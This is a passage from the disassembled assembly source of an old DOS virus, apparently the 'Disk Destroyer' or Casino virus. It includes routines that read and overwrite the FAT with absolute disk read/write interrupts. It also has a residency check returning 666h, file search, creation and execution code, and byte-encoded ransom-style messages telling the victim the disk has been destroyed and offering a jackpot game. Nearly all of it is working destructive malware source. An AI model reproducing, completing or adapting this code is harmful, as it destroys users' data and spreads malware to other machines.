						;  display char string at ds:dx
		jmp	short loc_35		; (09C7)
		nop
loc_35:
		jmp	short loc_35		; (09C7)
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_7		proc	near
		mov	ah,0
		push	ax
		mov	dh,0Bh
		mov	ah,2
		mov	bh,0
		int	10h			; Video display   ah=functn 02h
						;  set cursor location in dx
		pop	ax
		mov	bl,3
		div	bl			; al, ah rem = ax/reg
		mov	bl,ah
		mov	bh,0
		add	bx,609h
		mov	al,[bx]
		mov	ah,0Eh
		mov	bx,0
		int	10h			; Video display   ah=functn 0Eh
						;  write char al, teletype mode
		retn
sub_7		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_8		proc	near
		push	ds
		mov	bx,ds
		add	bx,1000h
		mov	ds,bx
		mov	bx,0
		mov	ah,19h
		int	21h			; DOS Services  ah=function 19h
						;  get default drive al  (0=a:)
		mov	cx,50h
		mov	dx,0
		int	25h			; Absolute disk read, drive al
		popf				; Pop flags
		mov	bx,0
		mov	ds,bx
		mov	ah,19h
		int	21h			; DOS Services  ah=function 19h
						;  get default drive al  (0=a:)
		mov	cx,50h
		mov	dx,0
		int	26h			; Absolute disk write, drive al
		popf				; Pop flags
		pop	ds
		retn
sub_8		endp
  
  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_9		proc	near
		push	ds
		mov	bx,ds
		add	bx,1000h
		mov	ds,bx
		mov	bx,0
		mov	ah,19h
		int	21h			; DOS Services  ah=function 19h
						;  get default drive al  (0=a:)
		mov	cx,50h
		mov	dx,0
		int	26h			; Absolute disk write, drive al
		popf				; Pop flags
		pop	ds
		retn
sub_9		endp
  
loc_36:
		mov	bx,0
		mov	ax,4B59h
		int	21h			; DOS Services  ah=function 4Bh
						;  run progm @ds:dx, parm @es:bx
		cmp	ax,666h
		jne	loc_37			; Jump if not equal
		jmp	loc_41			; (0AF0)
loc_37:
		push	ds
		pop	es
		push	ds
		push	cs
		pop	ds
		mov	si,0
		mov	di,917h
		mov	cx,100h
		cld				; Clear direction
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		pop	ds
		mov	ah,2Fh			; '/'
		int	21h			; DOS Services  ah=function 2Fh
						;  get DTA ptr into es:bx
		mov	ds:data_14e,bx		; (6AE6:0041=0)
		mov	ds:data_15e,es		; (6AE6:0043=6AE6h)
		mov	dx,4Eh
		mov	ah,1Ah
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
		mov	dx,11h
		mov	cx,3Fh
		mov	ah,4Eh			; 'N'
		int	21h			; DOS Services  ah=function 4Eh
						;  find 1st filenam match @ds:dx
		jc	loc_38			; Jump if carry Set
		mov	dx,11h
		call	sub_1			; (06EE)
		cmp	dl,1
		jne	loc_38			; Jump if not equal
		call	sub_2			; (073C)
loc_38:
		call	sub_5			; (07FD)
		mov	dx,20h
		mov	cx,2
		mov	ah,3Ch			; '<'
		int	21h			; DOS Services  ah=function 3Ch
						;  create/truncate file @ ds:dx
		jc	loc_40			; Jump if carry Set
		mov	bx,ax
		mov	dx,0
		mov	cx,91Ah
		mov	ah,40h			; '@'
		int	21h			; DOS Services  ah=function 40h
						;  write file cx=bytes, to ds:dx
		push	ax
		mov	ah,3Eh			; '>'
		int	21h			; DOS Services  ah=function 3Eh
						;  close file, bx=file handle
		pop	ax
		cmp	ax,cx
		je	loc_39			; Jump if equal
		mov	dx,20h
		mov	ah,41h			; 'A'
		int	21h			; DOS Services  ah=function 41h
						;  delete file, name @ ds:dx
		jmp	short loc_40		; (0AD1)
		db	90h
loc_39:
		push	cs
		pop	es
		mov	bx,cs:data_8e		; (6AE6:0002=0)
		sub	bx,92Ch
		mov	cx,cs
		sub	bx,cx
		mov	ah,4Ah			; 'J'
		int	21h			; DOS Services  ah=function 4Ah
						;  change mem allocation, bx=siz
		mov	dx,20h
		push	ds
		pop	es
		mov	bx,2Dh
		mov	ax,4B00h
		int	21h			; DOS Services  ah=function 4Bh
						;  run progm @ds:dx, parm @es:bx
loc_40:
		call	sub_6			; (0813)
		push	cs
		pop	es
		mov	di,0
		mov	si,917h
		mov	cx,0FFh
		cld				; Clear direction
		rep	movsb			; Rep when cx >0 Mov [si] to es:[di]
		mov	dx,ds:data_14e		; (6AE6:0041=0)
		mov	bx,ds:data_15e		; (6AE6:0043=6AE6h)
		mov	ds,bx
		mov	ah,1Ah
		int	21h			; DOS Services  ah=function 1Ah
						;  set DTA to ds:dx
loc_41:
		push	cs
		pop	ds
		jmp	$-0F32h
		jmp	$+3DFh
		db	48h, 9Bh, 9Ch, 3Fh, 5, 0Ah
		db	5, 3, 1, 3, 0, 6Eh
		db	71h, 6Dh, 6Dh, 84h, 84h, 84h
		db	0A8h, 0ADh, 0B7h, 0AFh, 84h, 0A8h
		db	0A9h, 0B7h, 0B8h, 0B6h, 0B3h, 0BDh
		db	0A9h, 0B6h, 84h, 5Dh, 84h, 0A5h
		db	84h, 0B7h, 0B3h, 0B9h, 0BAh, 0A9h
		db	0B2h, 0ADh, 0B6h, 84h, 0B3h, 0AAh
		db	84h, 0B1h, 0A5h, 0B0h, 0B8h, 0A5h
		db	6Eh, 71h, 6Eh, 71h, 6Dh, 6Dh
		db	0ADh, 84h, 0CCh, 0C5h, 0DAh, 0C9h
		db	84h, 0CEh, 0D9h, 0D7h, 0D8h, 84h
		db	0A8h, 0A9h, 0B7h, 0B8h, 0B6h, 0B3h
		db	0BDh, 0A9h, 0A8h, 84h, 0D8h, 0CCh
		db	0C9h, 84h, 0AAh, 0A5h, 0B8h, 84h
		db	0D3h, 0D2h, 84h, 0DDh, 0D3h, 0D9h
		db	0D6h, 84h, 0A8h, 0CDh, 0D7h, 0CFh
		db	84h, 85h, 85h, 6Eh, 71h, 84h
		db	84h, 84h, 84h, 84h, 84h, 0ACh
		db	0D3h, 0DBh, 0C9h, 0DAh, 0C9h, 0D6h
		db	90h, 84h, 0ADh, 84h, 0CCh, 0C5h
		db	0DAh, 0C9h, 84h, 0C5h, 84h, 0C7h
		db	0D3h, 0D4h, 0DDh, 84h, 0CDh, 0D2h
		db	84h, 0B6h, 0A5h, 0B1h, 90h, 84h
		db	0C5h, 0D2h, 0C8h, 84h, 0ADh, 0C4h
		db	0D1h, 84h, 0CBh, 0CDh, 0DAh, 0CDh
		db	0D2h, 0CBh, 84h, 0DDh, 0D3h, 0D9h
		db	84h, 0C5h, 84h, 0D0h, 0C5h, 0D7h
		db	0D8h, 84h, 0C7h, 0CCh, 0C5h, 0D2h
		db	0C7h, 0C9h, 6Eh, 71h, 6Dh, 6Dh
		db	6Dh, 0D8h, 0D3h, 84h, 0D6h, 0C9h
		db	0D7h, 0D8h, 0D3h, 0D6h, 0C9h, 84h
		db	0DDh, 0D3h, 0D9h, 0D6h, 84h, 0D4h
		db	0D6h, 0C9h, 0C7h, 0CDh, 0D3h, 0D9h
		db	0D7h, 84h, 0C8h, 0C5h, 0D8h, 0C5h
		db	92h, 6Eh, 71h, 84h, 84h, 84h
		db	84h, 84h, 0BBh, 0A5h, 0B6h, 0B2h
		db	0ADh, 0B2h, 0ABh, 9Eh, 84h, 0ADh
		db	0AAh, 84h, 0BDh, 0B3h, 0B9h, 84h
		db	0B6h, 0A9h, 0B7h, 0A9h, 0B8h, 84h
		db	0B2h, 0B3h, 0BBh, 90h, 84h, 0A5h
		db	0B0h, 0B0h, 84h, 0BDh, 0B3h, 0B9h
		db	0B6h, 84h, 0A8h, 0A5h, 0B8h, 0A5h
		db	84h, 0BBh, 0ADh, 0B0h, 0B0h, 84h
		db	0A6h, 0A9h, 84h, 0B0h, 0B3h, 0B7h
		db	0B8h, 84h, 91h, 84h, 0AAh, 0B3h
		db	0B6h, 0A9h, 0BAh, 0A9h, 0B6h, 84h
		db	85h, 85h, 6Eh, 71h, 6Dh, 6Dh
		db	84h, 84h, 84h, 0BDh, 0D3h, 0D9h
		db	0D6h, 84h, 0A8h, 0C5h, 0D8h, 0C5h
		db	84h, 0C8h, 0C9h, 0D4h, 0C9h, 0D2h
		db	0C8h, 0D7h, 84h, 0D3h, 0D2h, 84h
		db	0C5h, 84h, 0CBh, 0C5h, 0D1h, 0C9h
		db	84h, 0D3h, 0CAh, 84h, 0AEh, 0A5h
		db	0A7h, 0AFh, 0B4h, 0B3h, 0B8h, 71h
		db	6Eh, 71h, 6Eh, 6Dh, 6Dh, 84h
		db	84h, 84h, 84h, 84h, 84h, 0A7h
		db	0A5h, 0B7h, 0ADh, 0B2h, 0B3h, 84h
		db	0A8h, 0A9h, 84h, 0B1h, 0A5h, 0B0h
		db	0B8h, 0A9h, 84h, 0AEh, 0A5h, 0A7h
		db	0AFh, 0B4h, 0B3h, 0B8h
		db	'nqnqmmm-1'
		db	1Fh, 6Dh, 2Dh, 31h, 1Fh, 6Dh
		db	2Dh, 31h, 1Fh, 6Eh, 71h, 6Dh
		db	6Dh, 6Dh, 3Bh, 0, 3Bh, 6Dh
		db	3Bh, 0A3h, 3Bh, 6Dh, 3Bh, 0FFh
		db	';nqmmm,1 m,1 m,1 nqmmm'
		db	84h, 84h, 84h, 84h, 0A7h, 0B6h
		db	0A9h, 0A8h, 0ADh, 0B8h, 0B7h, 84h
		db	9Eh, 84h, 99h
		db	'nqqnqnmmm'
		db	0, 0, 0, 84h, 0A1h, 84h
		db	0BDh, 0D3h, 0D9h, 0D6h, 84h, 0A8h
		db	0CDh, 0D7h, 0CFh, 6Eh, 71h, 6Dh
		db	6Dh, 6Dh, 0A3h, 0A3h, 0A3h, 84h
		db	0A1h, 84h, 0B1h, 0DDh, 84h, 0B4h
		db	0CCh, 0D3h, 0D2h, 0C9h, 84h, 0B2h
		db	0D3h, 92h, 6Eh, 71h, 6Eh, 71h
		db	6Dh, 6Dh, 6Dh, 0A5h, 0B2h, 0BDh
		db	84h, 0AFh, 0A9h, 0BDh, 84h, 0B8h
		db	0B3h, 84h, 0B4h, 0B0h, 0A5h, 0BDh
		db	'qnqnqnqnqn'
		db	88h, 6Eh, 71h, 0A6h, 0A5h, 0B7h
		db	0B8h, 0A5h, 0B6h, 0A8h, 84h, 85h
		db	84h, 0BDh, 0D3h, 0D9h, 0C4h, 0D6h
		db	0C9h, 84h, 0D0h, 0D9h, 0C7h, 0CFh
		db	0DDh, 84h, 0D8h, 0CCh, 0CDh, 0D7h
		db	84h, 0D8h, 0CDh, 0D1h, 0C9h, 84h
		db	91h, 84h, 0C6h, 0D9h, 0D8h, 84h
		db	0CAh, 0D3h, 0D6h, 84h, 0DDh, 0D3h
		db	0D9h, 0D6h, 84h, 0D3h, 0DBh, 0D2h
		db	84h, 0D7h, 0C5h, 0CFh, 0C9h, 90h
		db	84h, 0D2h, 0D3h, 0DBh, 6Eh, 71h
		db	0B7h, 0BBh, 0ADh, 0B8h, 0A7h, 0ACh
		db	84h, 0B3h, 0AAh, 0AAh, 84h, 0BDh
		db	0B3h, 0B9h, 0B6h, 84h, 0A7h, 0B3h
		db	0B1h, 0B4h, 0B9h, 0B8h, 0A9h, 0B6h
		db	84h, 0A5h, 0B2h, 0A8h, 84h, 0A8h
		db	0B3h, 0B2h, 0C4h, 0B8h, 84h, 0B8h
		db	0B9h, 0B6h
loc_42:
		mov	dl,84h
		lodsw				; String [si] to ax
		mov	ax,0B384h
		mov	dl,84h
		mov	ax,0B0ADh
		mov	al,84h
		mov	ax,0B1B3h
		mov	bl,0B6h
		mov	dh,0B3h
		mov	bx,8584h
		test	ax,ds:data_33e[di]	; (6AE6:716E=0)
		mov	[bp+71h],ch
		mov	dl,0D3h
		test	ch,[bp+si-3827h]
		iret				; Interrupt return
		db	0CDh, 0D2h, 0C4h, 84h, 0A7h, 0CCh
		db	0C5h, 0D2h, 0C7h, 0C9h, 9Fh, 84h
		db	0C5h, 0D2h, 0C8h, 84h, 0ADh, 0C4h
		db	0D1h, 84h, 0D4h, 0D9h, 0D2h, 0CDh
		db	0D7h, 0CCh, 0CDh, 0D2h, 0CBh, 84h
		db	0DDh, 0D3h, 0D9h, 84h, 0CAh, 0D3h
		db	0D6h, 84h, 0D8h, 0D6h, 0DDh, 0CDh
		db	0D2h, 0CBh, 84h, 0D8h, 0D3h, 84h
		db	0D8h, 0D6h, 0C5h, 0C7h, 0C9h, 84h
		db	0D1h, 0C9h, 84h, 0C8h, 0D3h, 0DBh
		db	0D2h, 84h, 85h, 88h, 6Eh, 71h
		db	0ACh, 0A5h, 84h, 0ACh, 0A5h, 84h
		db	85h, 85h, 84h, 0BDh, 0D3h, 0D9h
		db	84h, 0C5h, 0D7h, 0D7h, 0CCh, 0D3h
		db	0D0h, 0C9h, 90h, 84h, 0DDh, 0D3h
		db	0D9h, 0C4h, 0DAh, 0C9h, 84h, 0D0h
		db	0D3h, 0D7h, 0D8h, 9Eh, 84h, 0D7h
		db	0C5h, 0DDh, 84h, 0A6h, 0DDh, 0C9h
		db	84h, 0D8h, 0D3h, 84h, 0DDh, 0D3h
		db	0D9h, 0D6h, 84h, 0A6h, 0C5h, 0D0h
		db	0D0h, 0D7h, 84h, 92h, 92h, 92h
		db	6Eh, 71h, 88h, 0CDh, 20h, 0
  
seg_a		ends
  
  
  
		end	start
